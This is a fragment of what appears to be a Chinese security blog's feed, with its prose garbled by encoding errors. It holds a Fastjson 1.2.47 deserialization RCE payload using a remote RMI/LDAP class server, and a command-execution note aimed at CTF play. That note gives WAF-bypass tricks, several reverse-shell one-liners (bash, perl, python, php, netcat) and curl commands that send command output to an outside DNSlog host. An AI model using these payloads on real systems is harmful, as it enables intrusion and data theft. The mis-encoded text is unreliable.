class="lazyload" data-srcset="20.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ¬è´¨ä¸Šå°±æ˜¯,JdbcRowSetImplè¿™ä¸ªç±»çš„dataSourceNameæ”¯æŒä¼ å…¥ä¸€ä¸ªrmiçš„æº.<br>å½“è§£æè¿™ä¸ªuriçš„æ—¶å€™ï¼Œå°±ä¼šæ”¯æŒrmiè¿œç¨‹è°ƒç”¨ï¼Œå»æŒ‡å®šçš„rmiåœ°å€ä¸­å»è°ƒç”¨æ–¹æ³•ã€‚<br>å½“è¿œç¨‹rmiæœåŠ¡æ‰¾ä¸åˆ°å¯¹åº”æ–¹æ³•æ—¶ï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªè¿œç¨‹classè®©è¯·æ±‚æ–¹å»è°ƒç”¨ï¼Œä»è€Œå»è·å–æˆ‘ä»¬æ¶æ„æ„é€ çš„classæ–‡ä»¶ï¼Œä»è€ŒRCEã€‚</p><p>èµ·ä¸€ä¸ªldapæœåŠ¡ä¹Ÿæ˜¯ä¸€æ ·çš„,è€Œä¸”ldapä¼¼ä¹æ¯”rmié€‚ç”¨æ€§æ›´å¹¿ã€‚<br>åªè¦æ”¹æˆ<code>java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer</code>å¹¶æŠŠpayloadä¸­çš„<code>rmi://</code>æ¢æˆ<code>ldap://</code>å³å¯ã€‚</p><p>æ³¨æ„ä¸‹è¿™ä¸¤ä¸ªæœåŠ¡åˆ©ç”¨ç‰ˆæœ¬</p><ul><li>åŸºäºrmiçš„åˆ©ç”¨æ–¹å¼ï¼šé€‚ç”¨jdkç‰ˆæœ¬ï¼šJDK 6u132, JDK 7u122, JDK 8u113ä¹‹å‰ã€‚</li><li>åŸºäºldapçš„åˆ©ç”¨æ–¹å¼ï¼šé€‚ç”¨jdkç‰ˆæœ¬ï¼šJDK 11.0.1ã€8u191ã€7u201ã€6u211ä¹‹å‰ã€‚</li></ul><h2 id="Fastjson-1-2-47-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#Fastjson-1-2-47-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="Fastjson 1.2.47 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>Fastjson 1.2.47 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</h2><p>è·Ÿä¸Šé¢æ²¡å•¥å¤§åŒºåˆ«ã€‚ç¯å¢ƒæ˜¯<code>openjdk:8u102</code>ã€‚åŒæ ·å¯ä»¥åŠ è½½rmi</p><p>å®é™…ä¸Šæ˜¯å› ä¸ºæœ€æ—©çš„fastjsonååºåˆ—åŒ–ä¹Ÿå°±æ˜¯ä¸Šé¢é‚£ä¸ª,æ˜¯æ”¯æŒååºåˆ—åŒ–ä»»æ„ç±»çš„ã€‚åªè¦æœ‰<code>@type</code>å°±èƒ½åšåˆ°ã€‚è€Œåé¢çš„ç‰ˆæœ¬ä¸»è¦æ˜¯ç¦æ­¢äº†ååºåˆ—åŒ–ä»»æ„ç±»çš„æ“ä½œ,å¹¶ä¸”å¯¹å¯ä»¥åˆ©ç”¨çš„ç±»åŠ å…¥é»‘åå•è€Œå·²ã€‚<br><a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">Fastjsonååºåˆ—åŒ–æ¼æ´ 1.2.24-1.2.48</a></p><p>è€Œè¿™ä¸ªç‰ˆæœ¬1.2.47çš„payloadåˆ™æ— éœ€å¼€å¯autotypeé€šæ€</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://xxxx:9999/Exploit"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè·Ÿä¸Šé¢æµç¨‹ä¸€æ ·çš„ç›´æ¥æ‰“,æ‹¿åˆ°shell.</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ ç¬”è®°-å‘½ä»¤æ‰§è¡ŒåŠèŠ±å¼bypasså†™shell</title>
      <link href="2020/03/02/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%8A%B1%E5%BC%8Fbypass%E5%86%99shell/"/>
      <url>2020/03/02/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%8A%B1%E5%BC%8Fbypass%E5%86%99shell/</url>
      
        <content type="html"><![CDATA[<p>  å‘½ä»¤æ‰§è¡Œçš„å‘å…¶å®æ—©å°±æƒ³å¡«äº†ã€‚æœ€æ—©æ˜¯å› ä¸ºæ ¡èµ›æ—¶ï¼Œeasyphpä¸€é¢˜è‡ªå·±å› ä¸ºä¸ç†Ÿæ‚‰å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç‰¹æ€§å¯¼è‡´å¥—å¨ƒé¢˜ç»•åˆ°æœ€åä¸€å±‚å´æ²¡æ‹¿åˆ°flagã€‚å½“æ—¶ååˆ†ä¸çˆ½ï¼Œä¸‹å®šå†³å¿ƒè¦å¥½å¥½äº†è§£ä¸‹å‘½ä»¤æ‰§è¡Œçš„ç›¸å…³çŸ¥è¯†ç‚¹ã€‚</p><p>å…³äºå‘½ä»¤æ‰§è¡Œæˆ‘å¤§ä½“ä¸Šå½’ä¸ºphpç»•è¿‡+rceä¸¤ç±»ã€‚phpçš„éš¾ç‚¹ä¸»è¦æ˜¯åœ¨ç»•è¿‡å†™shellä¸Šï¼Œè€Œlinuxçš„çŸ¥è¯†ä¸»è¦åœ¨RCEè¾¾æˆä¸Šã€‚</p><p>å…ˆä»ç®€å•è¯´èµ·ï¼š</p><a id="more"></a><h1 id="linux-å‘½ä»¤-amp-RCE"><a href="#linux-å‘½ä»¤-amp-RCE" class="headerlink" title="linux å‘½ä»¤&amp; RCE"></a>linux å‘½ä»¤&amp; RCE</h1><p>rce,å³remote command/code executeã€‚é€šå¸¸éƒ½æ˜¯æ¸—é€ä¸­å¸Œæœ›èƒ½å¤Ÿåˆ©ç”¨çš„æ¼æ´ä¹‹ä¸€ã€‚å› ä¸ºæˆ‘ä»¬å¯ä»¥ä»¥æ­¤è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè¯»å–æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶æˆ–è€…åå¼¹shellã€‚</p><h2 id="å‘½ä»¤åŠå…³é”®å­—waf"><a href="#å‘½ä»¤åŠå…³é”®å­—waf" class="headerlink" title="å‘½ä»¤åŠå…³é”®å­—waf"></a>å‘½ä»¤åŠå…³é”®å­—waf</h2><p>ç®€å•çš„å‘½ä»¤æ‰§è¡Œå¦‚DVWAé¶åœºé‡Œçš„command injection æ¨¡å—ã€‚å®ƒç»™äº†æˆ‘ä»¬ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè€Œå®ƒä¼šå°†è¾“å…¥æ¡†çš„å†…å®¹å½“åšå‘½ä»¤æ‰§è¡Œã€‚<br>è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±å¯ä»¥ç”¨å‘½ä»¤æ‹¼æ¥æ¥æ‰§è¡Œå…¶ä»–å‘½ä»¤ã€‚<br>1.ä½¿ç”¨<code>&amp;&amp; &amp; ;</code>ç›´æ¥å¤šè¯­å¥æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;ls</span><br><span class="line">127.0.0.1&amp;ls</span><br><span class="line">127.0.0.1; ls</span><br></pre></td></tr></table></figure><p>2.é«˜çº§ä¸€(äº¿)ç‚¹çš„ï¼Œä½¿ç”¨ç®¡é“ç¬¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1| ls</span><br></pre></td></tr></table></figure><p>ç®¡é“ç¬¦çš„å¦™ç”¨ä¸æ­¢è¿™ä¹ˆä¸€ç‚¹äº†ã€‚æ¯”å¦‚CTFæˆ–å®æˆ˜æ¸—é€ä¸­éƒ½å¯èƒ½ç”¨åˆ°çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'Y2F0Cg=='</span> | base64 -d</span><br></pre></td></tr></table></figure><p>åªè¦ç”¨ç®¡é“ç¬¦å¯ä»¥bypassæ‰ç»å¤§éƒ¨åˆ†å…³é”®å­—çš„wafã€‚<br>å®é™…åˆ©ç”¨ä¹‹è¯»flag.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span>  Y2F0IGZsYWcucGhw|base64 -d|bash</span><br></pre></td></tr></table></figure><p>bashå¦‚æœæ²¡æœ‰å¯ä»¥ç”¨sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span>  Y2F0IGZsYWcucGhw|base64 -d|sh</span><br></pre></td></tr></table></figure><p>åŒæ—¶åº”å¯¹å…³é”®å­—wafï¼Œlinuxçš„ç‰¹æ€§è¿˜å…è®¸æˆ‘ä»¬èŠ±å¼ç»•è¿‡<br>å¯¹ç©ºæ ¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$1</span> //<span class="variable">$1</span>æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½</span><br><span class="line">%20 </span><br><span class="line">%09</span><br></pre></td></tr></table></figure><p>å¯¹å…³é”®å­—ï¼Œå¦‚flagï¼Œcatï¼ŒåŒ…æ‹¬ä¸Šé¢ç®¡é“ç¬¦åœ¨å†…ä¹Ÿæœ‰å¾ˆå¤šæ–¹æ³•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat fl*  linuxä¸­*é€šé…ç¬¦åŒ¹é…ä»»æ„å­—æ•°</span><br><span class="line"><span class="built_in">echo</span> xxxxxxx| base64 -d </span><br><span class="line">ca\t fla\g</span><br><span class="line">cat fl<span class="string">''</span>ag</span><br><span class="line">a=f;b=lag;cat <span class="variable">$a</span><span class="variable">$b</span></span><br></pre></td></tr></table></figure><p>å¯¹å‘½ä»¤å‡½æ•°catçš„waf,å¯»æ‰¾æ›¿ä»£ä¹Ÿæ˜¯ä¸€ç§æ–¹æ³•ï¼Œæ¯•ç«Ÿè¯»å–æ–‡ä»¶å‡½æ•°å¾ˆå¤šã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">head  è¯»å¤´å‡ è¡Œ</span><br><span class="line">tail    è¯»å°¾å‡ è¡Œ</span><br><span class="line">tac     æŒ‰è¡Œå€’ç€è¯»</span><br><span class="line">more   </span><br><span class="line">less</span><br><span class="line">nl</span><br><span class="line">sort</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>å¦‚æœè¦å¥‡æ·«æŠ€å·§ï¼Œå¯ä»¥ä½¿ç”¨å¦‚<code>cat `ls`</code><br>åå¼•å·åœ¨linuxä¸­ä½œä¸ºå†…è”æ‰§è¡Œã€‚å°†ç›´æ¥è¾“å‡ºç»“æœã€‚æ‰€ä»¥å‡å¦‚æˆ‘ä»¬å°±åœ¨flagçš„ç›®å½•ä¸‹ï¼Œè¿™æ˜¯å®Œå…¨å¯ä»¥ç›´æ¥è€çš„ã€‚</p><p>ä»¥ä¸Šéƒ½æ˜¯ç›´æ¥åœ¨webshellæ‰§è¡Œè¯»å–æ–‡ä»¶çš„åŸºç¡€ä¸Šçš„ã€‚å®é™…ä¸Šæœ‰æ—¶å€™æˆ‘ä»¬åœ¨å®é™…æ¸—é€ä¸­éœ€è¦çš„æ˜¯åå¼¹shellã€‚åŒ…æ‹¬æœ‰çš„é¢˜ç›®ä¹Ÿæ˜¯éœ€è¦shellæ¥æ‰¾flagçš„ã€‚<br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br>è¿™ä¸ªç½‘ç«™æ€»ç»“äº†å¸¸è§çš„åå¼¹shellçš„æ–¹å¼ã€‚å®é™…ä¸Šæ€»ç»“ä¸‹å¸¸è§çš„å‡ ç§åå¼¹shell<br>1.bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span></span><br></pre></td></tr></table></figure><p>bashå¼çš„ç”¨åˆ°çš„éå¸¸å¤šã€‚ç„¶è€Œè¿˜æ˜¯ä¼šå‡ºç°æœ‰çš„å®¹å™¨å› ä¸ºæ˜¯dockerèµ·çš„è€Œæ²¡æœ‰bashæŒ‡ä»¤çš„é—®é¢˜ï¼Œè¿™ç§æ—¶å€™é€šå¸¸ç”¨shæ›¿ä»£ã€‚ä½†æ˜¯shå¹¶ä¸èƒ½åå¼¹shellã€‚æ‰€ä»¥è¿™å°±æ¶‰åŠåˆ°å…¶ä»–çš„å‡ ç§æ–¹æ³•ã€‚</p><p>2.perl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure><p>3.python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure><p>é€‰æ‹©pythonæ˜¯ä¸ªä¸é”™çš„æ›¿ä»£æ–¹å¼ï¼Œå› ä¸ºå¤§éƒ¨åˆ†linuxæœºå­ä¸Šéƒ½è£…å¥½äº†pythonã€‚(æ¯”å¦‚é¢˜ç›®ç¯å¢ƒæ˜¯flaskèµ·çš„æ—¶å€™ï¼Œè‚¯å®šæ˜¯æœ‰pythonäº†)<br>4.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><p>phpåŒç†ã€‚<br>5.netcat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br></pre></td></tr></table></figure><p>åŸæ¥çœ‹åˆ°æ–‡ç« è¯´ï¼Œæ‰€æœ‰linuxæœºå­éƒ½é¢„è£…å¥½äº†ncã€‚æˆ‘è§‰å¾—æ˜¯å¾ˆæ£’çš„ã€‚ä¸è¿‡è‡ªå·±å°è¯•è¿‡ncåå¼¹çš„shelläº¤äº’æ€§ç¨å¾®å·®äº†ä¸€ç‚¹ç‚¹ã€‚</p><p>å¦‚æœé‡åˆ°wafï¼Œå¯ä»¥ç”¨ä¸Šé¢æ™®é€šå‘½ä»¤ä¸€æ ·çš„bypassæ–¹æ³•è§£å†³ã€‚<br>æˆ–è€…æˆ‘ä»¬å¯ä»¥å¦‚æ­¤ï¼Œä½¿ç”¨<code>curl wget</code>ç­‰ç­‰ç›´æ¥è®¿é—®æˆ‘ä»¬vpsä¸Šçš„æå‰å†™å¥½çš„åå¼¹shellæ–‡ä»¶ã€‚</p><p>ä¹‹äºæ›´æ·±ä¸€æ­¥çš„å‘½ä»¤æ‰§è¡Œæš‚ä¸”ä¸è°ˆã€‚åœ¨æ¸—é€ä¸­è‡ªç„¶ä¼šç”¨åˆ°çš„ã€‚</p><h2 id="bypassé•¿åº¦é™åˆ¶"><a href="#bypassé•¿åº¦é™åˆ¶" class="headerlink" title="bypassé•¿åº¦é™åˆ¶"></a>bypassé•¿åº¦é™åˆ¶</h2><p>HITCON2017çš„baby-first-revengeçš„ä¾‹å­å¯ä»¥è¯´æ˜¯è€ä¾‹å­äº†ã€‚å®ƒçš„bypassé•¿åº¦å¯ä»¥è¾¾åˆ°5ä¸ª<br>å…·ä½“trickæ˜¯ä»¥ä¸‹è¿™äº›ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -t å¯ä»¥æŒ‰æ—¶é—´é¡ºåºåˆ—å‡ºæ‰€æœ‰æ–‡ä»¶</span><br><span class="line">linux å¯ä»¥ç”¨\è¿›è¡Œå‘½ä»¤çš„æ¢è¡Œ</span><br><span class="line">æ¢è¡Œä¸å½±å“å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">sh _åªè¦å››ä¸ªå­—ç¬¦å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤</span><br></pre></td></tr></table></figure><p>ç„¶è€Œå› ä¸ºè¿™ä¸ªè§£å†³æ–¹æ¡ˆå¤ªè¿‡é«˜çº§ï¼Œå¯¼è‡´å¤§å®¶éƒ½ä¼šäº†åå°±ä¸ä¼šå†æœ‰äººå‡ºè¿™æ–¹é¢çš„é¢˜ç›®è€ƒå¯Ÿäº†â€¦â€¦</p><h2 id="ç›²æ‰“-RCE-amp-timebased-RCE"><a href="#ç›²æ‰“-RCE-amp-timebased-RCE" class="headerlink" title="ç›²æ‰“ RCE &amp; timebased RCE"></a>ç›²æ‰“ RCE &amp; timebased RCE</h2><p>time-based RCEæ˜¯ä¸€ä¸ªå¸¸å¸¸ä½œä¸ºæ‹”é«˜æ°´å¹³çš„å‘½ä»¤æ‰§è¡Œè€ƒç‚¹ã€‚å…·ä½“å¸¸è§äºä¸€ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = $_GET[`cmd`];</span><br><span class="line">`$cmd`;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œæ²¡æœ‰å›æ˜¾æ€ä¹ˆåŠï¼Ÿå¸¸è§åŠæ³•ä¹‹ä¸€å½“ç„¶æ˜¯åˆ©ç”¨curl,æˆ–è€…wgetæŠŠç»“æœæ‰“åˆ°vpsä¸Šã€‚æœ‰ç‚¹xxeç›²æ‰“çš„å‘³é“ã€‚åªä¸è¿‡å¹¶ä¸éœ€è¦æå‰æ”¾å¥½æ–‡ä»¶ï¼Œåªè¦vpsç›‘å¬å³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`ls`</span><br></pre></td></tr></table></figure><p>å½“ç„¶getè¯·æ±‚çš„å¼Šç«¯ä¹‹ä¸€æ˜¯æˆ‘ä»¬åªèƒ½æ‰“å‡ºç»“æœçš„ä¸€è¡Œç»“æœï¼Œè¿™å½“ç„¶æ˜¯ä¸è¡Œçš„<br>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è½»æ¾åˆ©ç”¨sedå‘½ä»¤è§£å†³é—®é¢˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p`</span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 2p`</span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 3p`</span><br></pre></td></tr></table></figure><p>å°†åˆ†åˆ«æ‰“å‡ºæ¯ä¸€è¡Œçš„ä¿¡æ¯ã€‚<br>è¿›ä¸€æ­¥è¿˜å¯ä»¥æ‰“å‡ºä»»æ„è¡Œä»»æ„å­—æ®µå†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1`  æˆªå–ç¬¬ä¸€ä¸ªå­—</span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1-3` æˆªå–ç¬¬1~3ä¸ªå­—</span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 2-5` æˆªå–ç¬¬2~5ä¸ª</span><br></pre></td></tr></table></figure><p>åœ¨æ­¤åŸºç¡€ä¸Šä¹Ÿè¯ç”Ÿäº†time-based RCEã€‚åŸç†å°±å¦‚ä¸Šé¢ä¸€æ ·ã€‚å› ä¸ºå·²ç»æ²¡æœ‰å›æ˜¾äº†ï¼Œæˆ‘ä»¬åœ¨æµè§ˆå™¨é¡µé¢å°±å¯ä»¥ç›´æ¥æ„é€ rce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [$(whoami|base32|cut â€“c 1)=O];<span class="keyword">then</span> sleep 10;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>ç±»ä¼¼sqlæ—¶é—´ç›²æ³¨çš„åŸç†ã€‚å…¶ä¸­<code>[ ]</code>æ˜¯linuxçš„æ¡ä»¶è¡¨è¾¾å¼ç¬¦å·ã€‚ä½¿ç”¨base32æ˜¯å› ä¸ºæˆ‘ä»¬çš„è¿”å›å€¼å¯èƒ½æœ‰ç‰¹æ®Šå­—ç¬¦ã€‚<br>è¿™æ ·å°±å®Œå…¨å¯ä»¥ä¾é ç›²æ‰“è„šæœ¬æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>å…³äºlinuxå‘½ä»¤è¿˜æœ‰äº›tricks æ²¡æœ‰æåˆ°ï¼Œä¸€æ–¹é¢æ˜¯å› ä¸ºè‡ªå·±äº†è§£çš„æ¯•ç«Ÿæ˜¯æœ‰é™çš„ã€‚å¦ä¸€æ–¹é¢æ˜¯å› ä¸ºä¸‹é¢çš„å†…å®¹ä¸­å°†ç»§ç»­ä½¿ç”¨åˆ°ã€‚å…³äºphpç»“åˆlinuxå‘½ä»¤çš„ä¸€äº›tricksã€‚</p><h1 id="php-RCE-bypass-amp-èŠ±å¼å†™shell"><a href="#php-RCE-bypass-amp-èŠ±å¼å†™shell" class="headerlink" title="php RCE bypass &amp; èŠ±å¼å†™shell"></a>php RCE bypass &amp; èŠ±å¼å†™shell</h1><p>phpä¸­çš„RCEæ–¹å¼å¯ä¸å°‘ã€‚é€šå¸¸æœ€å¤§çš„éš¾ç‚¹æ˜¯å†™ä¸€ä¸ªwebshellå‡ºæ¥ã€‚è€Œå†™å‡ºwebshellåæ‰§è¡Œå‘½ä»¤ä¹Ÿä¼šé‡åˆ°ç¦ç”¨ç³»ç»Ÿå‡½æ•°çš„æƒ…å†µã€‚è¿™ç§æ—¶å€™å°±æœ‰è®¸è®¸å¤šå¤šçš„é«˜çº§æŠ€å·§ã€‚ä¸ä»…ä»…æ˜¯phpçš„ç‰¹æ€§é—®é¢˜äº†ï¼Œè¿˜æœ‰è®¸å¤šé«˜çº§æ„é€ ã€‚</p><h2 id="æ— å‚RCE"><a href="#æ— å‚RCE" class="headerlink" title="æ— å‚RCE"></a>æ— å‚RCE</h2><p>  ä¹‹æ‰€ä»¥æŠŠæ— å‚RCEæ”¾åˆ°è¿™ä¸€å—ã€‚å°±æ˜¯å› ä¸ºæ— å‚RCEçš„åˆ©ç”¨ä¸»è¦ä¾é phpå‡½æ•°è¾¾æˆã€‚æ‰€ä»¥å°ç»“ä¸‹å¸¸è§trickã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€æ—©å‡ºè‡ªäºpç‰›çš„easyphplimit<a href="https://www.jianshu.com/p/19a37402554f" target="_blank" rel="noopener">https://www.jianshu.com/p/19a37402554f</a>æˆ‘è¿˜åœ¨GXYCTFä¸­å¤ç°åŒä¸ºæ— å‚RCEçš„é¢˜ç›®<a href="https://www.jianshu.com/p/2b5e7bd64264" target="_blank" rel="noopener">https://www.jianshu.com/p/2b5e7bd64264</a><br>å…¶å®æ— å‚RCEçš„ä¸»è¦è¦ç‚¹å°±æ˜¯åªèƒ½æ‰§è¡Œå¦‚ä¸‹ç±»å‹å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a(b(c()));</span><br><span class="line">a();</span><br></pre></td></tr></table></figure><p>ä¸ªäººç¬¬ä¸€ä¹ æƒ¯é¦–å…ˆæ˜¯ä½¿ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">'.'</span>))</span><br></pre></td></tr></table></figure><p>æ¢æµ‹ç›®å½•ã€‚ä½†æ­¤å¤„æ˜¾ç„¶<code>.  &#39;&#39;</code>éƒ½ä½¿ç”¨ä¸äº†ã€‚é‚£ä¹ˆæ€ä¹ˆæ„é€ å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥è½»æ¾ä½¿ç”¨å‡½æ•°è¾¾æˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p><code>localeconv</code>è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚å…¶æ•°ç»„å¤´ä¸€ä¸ªå€¼ä¸º<code>decimal_point</code>ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªç‚¹ã€‚ 